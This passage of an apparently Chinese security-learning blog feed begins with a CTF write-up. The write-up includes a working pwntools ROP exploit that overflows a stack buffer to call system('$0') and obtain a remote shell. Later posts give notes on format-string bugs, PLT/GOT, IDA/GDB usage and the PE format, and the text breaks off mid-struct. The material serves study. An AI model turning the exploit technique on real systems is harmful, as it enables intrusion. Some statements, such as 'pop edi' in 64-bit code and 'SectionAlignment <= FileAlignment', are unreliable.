title="pwn4"></a>pwn4</h3><blockquote><p>利用栈溢出控制程序的走向</p></blockquote><p>首先使用file与checksec查看一下，64为elf文件，且没有开任何保护，那没有canary，就可以利用栈溢出控制程序走向了。</p><p>ida中看一下，明显存在溢出。</p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605092808030-1591322466624.png" alt="image-20200605092808030"></p><p>继续看一下字符串，找到引用的地方发现了system命令，但不是打开shell之类的字符串。</p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605093020161.png" alt="image-20200605093020161"></p><p>由于刚接触，很多东西都不知道，看了writeup，长知识了。由于题中有 $0 字符，而这就是 shell本身的名称，可以用它当作传入的system（）函数的参数使用。</p><blockquote><p>一个知识点：<code>system()</code>会调用<code>fork()</code>产生子进程，由子进程来调用<code>/bin/bash -c string</code>来执行参数<code>string</code>字符串所代表的命令，此命令执行完后随即返回原调用的进程。</p></blockquote><blockquote><p>64位程序传参的特点：<strong>使用寄存器传参</strong>，分别用<code>rdi</code>、<code>rsi</code>、<code>rdx</code>、<code>rcx</code>、<code>r8</code>、<code>r9</code>来传递参数（参数个数小于7的时候）。</p></blockquote><p>所以这里要先让程序的走向到 <code>pop edi;ret</code>, 让第一个传参寄存器得到 $0的地址，那后面再通过ret 使system（）的地址弹出给 eip，得到shell。</p><p>开始工作。</p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605095114997.png" alt="image-20200605095114997"></p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605095231700.png" alt="image-20200605095231700"></p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605095322038.png" alt="image-20200605095322038"></p><p>写利用：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">'114.116.54.89'</span>, <span class="number">10004</span>)</span><br><span class="line"></span><br><span class="line">edi = <span class="number">0x00000000004007d3</span></span><br><span class="line">bash = <span class="number">0x000000000060111f</span></span><br><span class="line">sys = <span class="number">0x000000000040075A</span></span><br><span class="line"></span><br><span class="line">payload = (<span class="number">0x10</span>+<span class="number">8</span>)*<span class="string">'a'</span> + p64(edi) + p64(bash) + p64(sys)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>得到shell。</p><p><img src="/2020/06/04/pwn%E7%BB%83%E4%B9%A0/image-20200605095503617.png" alt="image-20200605095503617"></p><p>总结：1.在没有‘bin\bash’字符串时看看’$0‘。2.64位程序的传参方式，寄存器顺序。3.ROPgadget工具的使用。</p>]]></content>
      
      
      <categories>
          
          <category> Pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>pwn笔记</title>
      <link href="/2020/06/03/pwn%E7%AC%94%E8%AE%B0/"/>
      <url>/2020/06/03/pwn%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="栈的学习理解"><a href="#栈的学习理解" class="headerlink" title="栈的学习理解"></a>栈的学习理解</h2><p>1.对于栈，主要是程序运行中保存函数的运行状态信息，参数及局部变量。发生函数调用时，调用函数（caller）的状态被保存在栈内，被调用函数（callee）的状态被压入调用栈的栈顶；函数调用结束后通过一些列指令还原调用函数的状态信息，并执行调用函数下一条指令。</p><blockquote><p>入栈顺序：1.参数 2.调用函数的下一条指令地址（通过 call）3.调用函数栈的基地址（ebp）4.被调用函数需要使用的局部变量。<a id="more"></a></p></blockquote><p>2.一张图可以很清楚的表示出来。</p><p><img src="/2020/06/03/pwn%E7%AC%94%E8%AE%B0/image-20200609114209670.png" alt="image-20200609114209670"></p><p>3.在ida中看这个也很是方便。</p><p><img src="/2020/06/03/pwn%E7%AC%94%E8%AE%B0/image-20200603141926461.png" alt="image-20200603141926461"></p><blockquote><p>函数调用结束后：1.先弹出局部变量（mov esp, ebp）2.接着返回调用函数的基地址（pop ebp）3.最后弹出被调用函数的返回地址（pop eip）。此时函数就接着执行被调用函数后面一条指令，再遇到函数调用也是同样的栈操作。</p><p>在看汇编中可以发现，程序在每次弹出局部变量与ebp都是使用一条指令leave，也就是 mov esp, ebp; pop ebp 的功能。</p></blockquote><h2 id="函数传参从左到右"><a href="#函数传参从左到右" class="headerlink" title="函数传参从左到右"></a>函数传参从左到右</h2><p>1.函数传参都是从右向左的。如果是从左向右会怎么样呢？</p><p>2.拿经典的printf(const char *format, argv..)来假设。format最先进栈，之后是各个参数进栈，然后是被调函数的返回地址，调用函数基地址。这个时候被调函数首先肯定是要找到format，但是在它上面还有未知个数的参数，想要知道参数个数又必须找到format，要找到format又必须知道参数个数。这样以来就陷入这样的死循环。</p><p>3.当然从右往左传参就不一样了，直接加固定的esp就可以先找到format，再依次检索参数即可。</p><h2 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h2><p>1.触发格式化字符漏洞的主要函数有：printf，sprintf，fprintf。</p><p>2.printf（）函数在执行时并不知道参数个数，它内部有一一个指针，用来索检格式化字符串。对于特定类型%，就去取相应参数的值，直到索检到格式化字符串结束。所以没有参数，代码也会将format string 后面的内存当做参数以16进制输出。这样就会造成内存泄露。</p><p>3.当然，规范的使用printf()等函数，还是不会问题。主要就是像<code>gets(s);printf(s)</code>这样的用法，使这个格式化字符串的输入权交给了我们。</p><p>4.其中一个重要的格式化说明符，也是这个漏洞利用的关键。<strong>%xn</strong>，将我们前面已经输入的字符个数值写入后面的第x个参数的地址内。</p><p>5.一个例子可以很好的说明。</p><p><img src="/2020/06/03/pwn%E7%AC%94%E8%AE%B0/image-20200605190434500.png" alt="image-20200605190434500"></p><h2 id="plt与got"><a href="#plt与got" class="headerlink" title="plt与got"></a>plt与got</h2><p>1.他们存在实质就是为了对程序所要使用的公共函数（在动态链接库里）进行一个重定位，这就好比PE中的输入表的中的地址修正。</p><p>2.对于elf文件，它在执行一个动态库函数如printf函数时，先call printf@plt（printf@plt其实是一小段代码的首地址），然后在printf@plt这段代码中再到.got.plt中找函数实际的地址最后跳转。</p><p>3.那其实 .plt其实就是存放着所要使用函数的信息及跳转，而所有要使用的函数信息就组成了 .plt表。</p><p>4.对于.got表就是存在每个所需要的函数的实际地址，.got.plt其实是.got表的一部分。</p><p><strong>5.所以在pwn题中，找动态库函数的实际地址时要用 elf.got[‘函数名称’]；执行函数的地址用 elf.plt[‘函数地址’]。</strong></p>]]></content>
      
      
      <categories>
          
          <category> Pwn </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>工具使用总结</title>
      <link href="/2020/06/02/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/"/>
      <url>/2020/06/02/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>记录一下平时使用工具的知识点。<a id="more"></a></p><h2 id="IDA实用快捷键"><a href="#IDA实用快捷键" class="headerlink" title="IDA实用快捷键"></a>IDA实用快捷键</h2><ul><li>空格：Graph overview 与 Text view 之间相关切换</li><li>tap：伪代码与汇编代码快速切换</li><li>alt+t：搜索字符串</li><li>shift+e：将数据以指令方式提取出来</li><li>ctrl+s：查看程序各个段的情况</li><li>u：取消定义；a：数据转化为字符串</li><li>p：数据转化为函数</li><li>y：改变数据类型</li><li>alt+d：改变数据类型</li><li>alt+a：改变字符串的样式</li><li>?：计算表达式</li></ul><h2 id="GDB脚本的使用"><a href="#GDB脚本的使用" class="headerlink" title="GDB脚本的使用"></a>GDB脚本的使用</h2><ol><li><p>执行gdb脚本有2中反方式，一：直接输入defien命令，输入指令，最后执行。二：单独写成一个脚本文件使用 source 来执行。</p></li><li><p>gdb脚本中的 查看内存内容的方法：x/&lt;n/f/u&gt; <addr>     n、f、u是可选的参数。</addr></p><p>n：显示的内存单元的个数，f：表示显示的格式，其中：s：字符串显示，x：按十六进制格式显示，d：按十进制格式显示变量</p><p>u：按十六进制格式显示无符号整型，t：按二进制格式显示， o：按八进制格式显示，c：按字符格式显示变量。</p><p>最后的u表示每个单元的大小，其中：b表示单字节，h表示双字节，w表示四字 节，g表示八字节。</p><p>如： x/127xb  表示将 127个的单字节单元的数据按16进制格式显示出来。</p></li><li><p>脚本中的空格要求十分严格。</p></li></ol><h2 id="GDB常用命令"><a href="#GDB常用命令" class="headerlink" title="GDB常用命令"></a>GDB常用命令</h2><ul><li><p>layout+制定显示内容：用于对我们要显示的内容进行分一个窗口显示，达到一边执行一边显示，如 layout asm</p></li><li><p>r：开始运行；c：继续运行；si：单步步入；n：单步步过；</p></li><li><p>disassemble main：查看main函数；x/2wx$esp：以16进制查看$esp地址处2个单位的内容，每个单位4个字节（上面有总结）</p></li><li><p>i r：查看寄存器的值；</p></li><li><p>starti：可以先将程序打开，但是不运行。</p></li><li><p>info file：查看文件的信息，比如程序入口点</p></li><li><p>layout src：显示源代码，layout asm：显示汇编窗口</p></li><li><p>layout regs：显示源代码/汇编/寄存器窗口</p></li><li><p>ctrl+x+1：但窗口模式，ctrl+x+2：双窗口模式，ctrl+x+a：回到传统模式</p></li><li><p>d+编号：删除编号处的断点</p></li><li><p>finish：执行到当前函数返回</p></li><li><p>bt：打印栈帧关系</p></li><li><p>i b：查看断点信息</p></li><li><p>gdb调试时要使用shell可以直接输入shell，使用完shell要回到gdb可直接输入exit。</p></li></ul><h2 id="对开启了PIE且去掉符号表的程序下断"><a href="#对开启了PIE且去掉符号表的程序下断" class="headerlink" title="对开启了PIE且去掉符号表的程序下断"></a>对开启了PIE且去掉符号表的程序下断</h2><p>在linux的 /proc目录中，每个进程都会在此目录下新建一个进程id为名的文件夹，在该文件夹下的map_files，存储着进程加载的基地址与动态链接的地址信息。</p><p>所以利用以上找到程序的基地址后，再通过修改ida载入的基地址，gdb就与ida中看到的地址对应了，方便调试。</p><h2 id="IDA中运行脚本-idc-python"><a href="#IDA中运行脚本-idc-python" class="headerlink" title="IDA中运行脚本(idc python)"></a>IDA中运行脚本(idc python)</h2><h3 id="idc是ida中内置的脚本语言，一种解释性语言"><a href="#idc是ida中内置的脚本语言，一种解释性语言" class="headerlink" title="idc是ida中内置的脚本语言，一种解释性语言"></a>idc是ida中内置的脚本语言，一种解释性语言</h3><blockquote><p>运行脚本 alt+F7；单行执行python ctrl+F3；查看最近脚本文件：alt+F9</p></blockquote><ol><li><p>执行方法：使用shift+F2快捷键，输入语句后 run；或者直接（alt+F7）添加 script，然后执行。</p></li><li><p>idc中的语法大多与C语言类似。这里总结一些特殊的。</p><ul><li><p>message与C语言printf 用法相同。</p></li><li><p>idc中的变量都定义为：auto 变量名；字符串可以直接用 + 号连接（auto s = “ida” + “idc”;）；支持切片操作。</p></li><li><p>条件表达式中switch不支持。</p></li><li><p>idc中函数不需要指明类型，但必须都定义为静态（static main(){ }）。</p></li></ul></li></ol><h3 id="Python脚本"><a href="#Python脚本" class="headerlink" title="Python脚本"></a>Python脚本</h3><ul><li>shift+f2：打开写脚本的窗口</li><li>alt+f7：载入执行一个脚本</li></ul>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PE学习</title>
      <link href="/2020/05/30/PE%E5%AD%A6%E4%B9%A0/"/>
      <url>/2020/05/30/PE%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="0x1-基础概念"><a href="#0x1-基础概念" class="headerlink" title="0x1 基础概念:"></a>0x1 基础概念:</h2><table><thead><tr><th>EXE文件和DLL文件基本上只是语义上的区别, 唯一区别是有一个标识字段指出EXE或DLL, 常见的PE文件格式有:DLL，EXE，OCX，SYS, SCR, CPL, OBJ等</th></tr></thead><tbody><tr><td><strong>64位的PE文件格式, 做了简单的修饰, 叫PE32+/PE+, 32位字段扩展位64字段</strong></td></tr><tr><td><strong>PE格式的定义地方在 <code>winnt.h</code> 头文件中我们能在其中找到PE文件的定义</strong>  <strong><em>如下图VC的路径查找</em></strong>  <a id="more"></a></td></tr><tr><td><img src="/2020/05/30/PE%E5%AD%A6%E4%B9%A0/image-20200507103628502-1590826740464.png" alt="image-20200507103628502"></td></tr><tr><td><strong>VA是进程虚拟内存的绝对地址, RVA是相对虚拟地址      RVA+ImageBase = VA</strong></td></tr><tr><td><strong>32位的Windows OS中, 各进程都分配有4GB的虚拟内存, 所以VA范围: 00000000 ~ FFFFFFFF</strong></td></tr></tbody></table><p>PE文件总体框架.</p><p><img src="/2020/05/30/PE%E5%AD%A6%E4%B9%A0/image-20200520084527063-1590826622690.png" alt="image-20200520084527063"></p><p>PE文件执行顺序.</p><table><thead><tr><th>1.执行一个PE文件时, PE装载器首先会找DOS头签名(MZ),检查是否有效,  然后是DOS头里的找 e_lfanew(最后一个成员, 指示PE头的), 如果找到, 则直接跳转.</th></tr></thead><tbody><tr><td><strong>2.找到PE头, 开始检查PE头信息属性是否有效, 如果有效, 就跳转到PE头尾部.</strong></td></tr><tr><td><strong>3.紧跟PE头尾部的是节表, PE装载器开始读取节表中记录了每个属性的信息. 平且采用文件映射将这些节映射到内存.    <u>文件映射: 在执行一个PE文件的时候，Windows并不在一开始就将整个文件读入内存,而是采用与内存映射的机制,也就是说，Windows装载器在装载的时候仅仅建立好虚拟地址和PE文件之间的映射关系,只有真正执行到某个内存页中的指令或者访问某一页中的数据时,这个页面才会被从磁盘提交到物理内存,这种机制使文件装入的速度和文件大小没有太大的关系</u></strong></td></tr><tr><td><strong>4.PE文件映射入内存后, PE装载器继续处理一些逻辑结构, 如输入表的修正.</strong></td></tr></tbody></table><h2 id="0x2-MS-DOS头部及DOS存根"><a href="#0x2-MS-DOS头部及DOS存根" class="headerlink" title="0x2 MS-DOS头部及DOS存根"></a>0x2 MS-DOS头部及DOS存根</h2><table><thead><tr><th>DOS头的作用是兼容MS-DOS操作系统中的可执行文件, 该结构体大小为64字节(0x40)</th></tr></thead><tbody><tr><td><strong>2个重要成员 e_magic(DOS头第一个成员): DOS签名(4D5A -&gt; ASCII值 MZ)    e_lfanew(DOS头最后一个成员): 指示NT头的偏移, 从这里找到PE头(取决于DOS存根大小)</strong></td></tr><tr><td><strong>DOS存根是DOS头与PE文件头中间部分的内容, 为16位的汇编指令组成, 既有代码也有数据, 大小不固定</strong></td></tr><tr><td><strong>我们知道DOS存根的内容是当我们的程序在DOS环境中运行时执行的代码, 也就是给一个提示信息:<code>This is program cannot be run in DOS mode</code>, 那我们是可以随便将其内容修改为自己想填充的东西, 反正不会影响在window os中的运行,  但记住这个大小是不能修改的, 会影响后面指令索引地址跟着出错, 最后程序崩溃(刚开始学习时在一道逆向题中, 就犯了这个错)</strong>      <strong>如下图所示OD程序, 重要字段已标出(DOS存根从0x40 - 0x1FF)</strong></td></tr><tr><td><img src="/2020/05/30/PE%E5%AD%A6%E4%B9%A0/image-20200508155307169-1590826775538.png" alt="image-20200508155307169"></td></tr></tbody></table><h2 id="0x3-NT头"><a href="#0x3-NT头" class="headerlink" title="0x3 NT头"></a>0x3 NT头</h2><p><strong>分别介绍3个结构体</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_NT_HEADERS</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    DOWORD Signature;</span><br><span class="line">    <span class="comment">//PE头的标志 50450000</span></span><br><span class="line">    </span><br><span class="line">    IMAGE_FILE_HEADER FileHeader;</span><br><span class="line">    <span class="comment">//文件头  size: 0xF8  记载文件的大部分属性</span></span><br><span class="line">    </span><br><span class="line">    IMAGE_OPTIONAL_HEADER32 OptionalHeader;</span><br><span class="line">    <span class="comment">//可选头  very important</span></span><br><span class="line">    </span><br><span class="line">&#125;IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_FILE_HEADER</span></span></span><br><span class="line"><span class="class"> &#123;</span></span><br><span class="line">     WORD    Machine;</span><br><span class="line">     <span class="comment">//指出该PE文件运行的平台,每个CPU都有唯一的标识码,一般0x14c(x86)</span></span><br><span class="line">     <span class="number">014</span>C</span><br><span class="line">            </span><br><span class="line">     WORD    NumberOfSections; </span><br><span class="line">     <span class="comment">//指出文件中存在的节区数量 注:这里的定义一定要等于实际</span></span><br><span class="line">     <span class="comment">//大小, 不然程序会运行失败</span></span><br><span class="line">     <span class="number">0008</span>      </span><br><span class="line">         </span><br><span class="line">     DWORD   TimeDateStamp;</span><br><span class="line">     <span class="comment">//PE文件的创建时间，一般有连接器填写 UTC（世界标准时间）进</span></span><br><span class="line">     <span class="comment">//行存储 从1970年1月1日00:00:00算起的秒数值 我们可以用C</span></span><br><span class="line">     <span class="comment">//语言的localtime()函数(时区也会转换)计算.</span></span><br><span class="line">     <span class="number">40B</span>10868  </span><br><span class="line">         </span><br><span class="line">     DWORD   PointerToSymbolTable;</span><br><span class="line">     <span class="comment">//指向符号表COFF的指针, 用于调试信息. 发现每次看都是0</span></span><br><span class="line">     <span class="number">00000000</span></span><br><span class="line">         </span><br><span class="line">     DWORD   NumberOfSymbols;</span><br><span class="line">     <span class="comment">//符号表数量. 发现每次看都是0</span></span><br><span class="line">     <span class="number">00000000</span></span><br><span class="line">         </span><br><span class="line">     WORD    SizeOfOptionalHeader;</span><br><span class="line">     <span class="comment">//指出PE的IMAGE_OPTIONAL_HEADER32结构体或者</span></span><br><span class="line">     <span class="comment">//PE+格式文件的IMAGE_OPTIONAL_HEADER64结构体的长度</span></span><br><span class="line">     <span class="comment">//这两个结构体尺寸是不相同的，所以需要SizeOfOptionalHeader</span></span><br><span class="line">     <span class="comment">//中指明大小32位通常位: E0  64位通常为: F0(不是绝对的)</span></span><br><span class="line">     <span class="comment">//它们只是最小值，可能有更大的值</span></span><br><span class="line">     <span class="number">00E0</span>    </span><br><span class="line">         </span><br><span class="line">     WORD    Characteristics;</span><br><span class="line">     <span class="comment">//标识文件的属性, 文件是否可运行, 是否为DLL文件等.</span></span><br><span class="line">     <span class="comment">//二进制中每一位代表不同属性, 以 bit oR形式结合起来</span></span><br><span class="line">     <span class="comment">//2个需要记住的值. 0002h:.exe文件  2000h: .dll文件 </span></span><br><span class="line">     <span class="number">010</span>E        </span><br><span class="line">          </span><br><span class="line"> &#125; IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;</span><br><span class="line"> </span><br><span class="line"> 下图为OD程序的文件头. 在上面每个成员下面依次标出.</span><br></pre></td></tr></table></figure><p>  <img src="/2020/05/30/PE%E5%AD%A6%E4%B9%A0/image-20200507203805570-1590826622690.png" alt="image-20200507203805570"></p>  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">DATA_DIRECTORY</span>////定义了<span class="title">DataDirectory</span>的结构体 </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    DOWORD VirtualAddress;</span><br><span class="line">    <span class="comment">//该结构体的RVA</span></span><br><span class="line">    </span><br><span class="line">    DOWORD Size;</span><br><span class="line">    <span class="comment">//该结构体的大小</span></span><br><span class="line">&#125;IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IMAGE_NUMBEROF_DIRECTORY_ENTRIES 16</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IMAGE_OPTIONAL_HEADER</span>   </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    WORD    Magic;</span><br><span class="line">    <span class="comment">//这个可选头的类型  PE: 10Bh   PE+: 20Bh  可以依次区分是32位还是64位</span></span><br><span class="line">    <span class="number">010B</span></span><br><span class="line">    </span><br><span class="line">    BYTE    MajorLinkerVersion;</span><br><span class="line">    <span class="comment">//链接器的版本号(不重要)</span></span><br><span class="line">    <span class="number">05</span></span><br><span class="line">    </span><br><span class="line">    BYTE    MinorLinkerVersion;</span><br><span class="line">    <span class="comment">//链接器的小版本号(不重要)</span></span><br><span class="line">    <span class="number">00</span></span><br><span class="line">    </span><br><span class="line">    DWORD   SizeOfCode;</span><br><span class="line">    <span class="comment">//代码段的长度</span></span><br><span class="line">    <span class="number">000</span>AF000</span><br><span class="line">    </span><br><span class="line">    DWORD   SizeOfInitializedData;</span><br><span class="line">    <span class="comment">//初始化的数据长度</span></span><br><span class="line">    <span class="number">0008</span>EC00</span><br><span class="line">    </span><br><span class="line">    DWORD   SizeOfUninitializedData;</span><br><span class="line">    <span class="comment">//未初始化的数据长度</span></span><br><span class="line">    <span class="number">00000000</span></span><br><span class="line">    </span><br><span class="line">    DWORD   AddressOfEntryPoint;</span><br><span class="line">    <span class="comment">//程序EP的RVA, 指出程序最先执行代码的起始地址 (很重要)</span></span><br><span class="line">    <span class="number">00000100</span></span><br><span class="line">    </span><br><span class="line">    DWORD   BaseOfCode;</span><br><span class="line">    <span class="comment">//代码段起始地址的RVA</span></span><br><span class="line">    <span class="number">00000100</span></span><br><span class="line">    </span><br><span class="line">    DWORD   BaseOfData;</span><br><span class="line">    <span class="comment">//数据段起始地址的RVA</span></span><br><span class="line">    <span class="number">000B</span>0000</span><br><span class="line">    </span><br><span class="line">    DWORD   ImageBase;</span><br><span class="line">    <span class="comment">//VA: 0~FFFFFFFF(32位系统).PE文件加载到虚拟内存时, 指出文件优先装入地址</span></span><br><span class="line">    <span class="comment">//EXE, DLL文件被装载到0~7FFFFFFF</span></span><br><span class="line">    <span class="comment">//SYS文件载入内核内存的 80000000~FFFFFFFF</span></span><br><span class="line">    <span class="comment">//执行PE文件时,PE装载器会把EIP设置为: ImageBase+AddressOfEntrypoint</span></span><br><span class="line">    <span class="number">00400000</span>    </span><br><span class="line">         </span><br><span class="line">    DWORD   SectionAlignment;</span><br><span class="line">    <span class="comment">//节在内存中的最小单位 (对齐单位) 一般为: 1000h</span></span><br><span class="line">    <span class="number">00001000</span></span><br><span class="line">    </span><br><span class="line">    DWORD   FileAlignment;</span><br><span class="line">    <span class="comment">//节在磁盘文件中的最小单位 (对齐单位) 一般为: 200h</span></span><br><span class="line">    <span class="comment">//一般SectionAlignment &lt;= FileAlignment,节省储存空间.</span></span><br><span class="line">    <span class="number">00000200</span>     </span><br><span class="line">    </span><br><span class="line">    WORD    MajorOperatingSystemVersion;</span><br><span class="line">    <span class="comment">//操作系统主版本号(不重要)</span></span><br><span class="line">    <span class="number">0004</span></span><br><span class="line">    </span><br><span class="line">    WORD    MinorOperatingSystemVersion;</span><br><span class="line">    <span class="comment">//操作系统小版本号(不重要)</span></span><br><span class="line">    <span class="number">0000</span></span><br><span class="line">    </span><br><span class="line">    WORD    MajorImageVersion;</span><br><span class="line">    <span class="comment">//映象文件主版本号, 这个是开发者自己指定的，由连接器填写(不重要)</span></span><br><span class="line">    <span class="number">0000</span></span><br><span class="line">    </span><br><span class="line">    WORD    MinorImageVersion;</span><br><span class="line">    <span class="comment">//映象文件小版本号(不重要)</span></span><br><span class="line">    <span class="number">0000</span></span><br><span class="line">    </span><br><span class="line">    WORD    MajorSubsystemVersion;</span><br><span class="line">    <span class="comment">//子系统版本号</span></span><br><span class="line">    <span class="number">0004</span></span><br><span class="line">    </span><br><span class="line">    WORD    MinorSubsystemVersion;</span><br><span class="line">    <span class="comment">//子系统小版本号</span></span><br><span class="line">    <span class="number">0000</span></span><br><span class="line">    </span><br><span class="line">    DWORD   Win32VersionValue;</span><br><span class="line">    <span class="comment">//Win32版本值 目前看过的文件都是 0</span></span><br><span class="line">    <span class="number">00000000</span></span><br><span class="line">    </span><br><span class="line">    DWORD   SizeOfImage;</span><br><span class="line">    <span class="comment">//指定PE image在虚拟内存中所占空间的大小 SectionAlignment的倍数</span></span><br><span class="line">    <span class="number">00180000</span></span><br><span class="line">    </span><br><span class="line">    DWORD   SizeOfHeaders;</span><br><span class="line">    <span class="comment">//指出整个PE头的大小(FileAlignment整数倍)</span></span><br><span class="line">    <span class="comment">//它也是从文件的开头到第一节的原始数据的偏移量, 可以找到第一节区</span></span><br><span class="line">    <span class="number">00000600</span>   </span><br><span class="line">    </span><br><span class="line">    DWORD   CheckSum;</span><br><span class="line">    <span class="comment">//映象文件的校验和 目的是为了防止载入无论如何都会冲突的、已损坏的二进制文件</span></span><br><span class="line">    <span class="number">00000000</span></span><br><span class="line">    </span><br><span class="line">    WORD    Subsystem;</span><br><span class="line">    <span 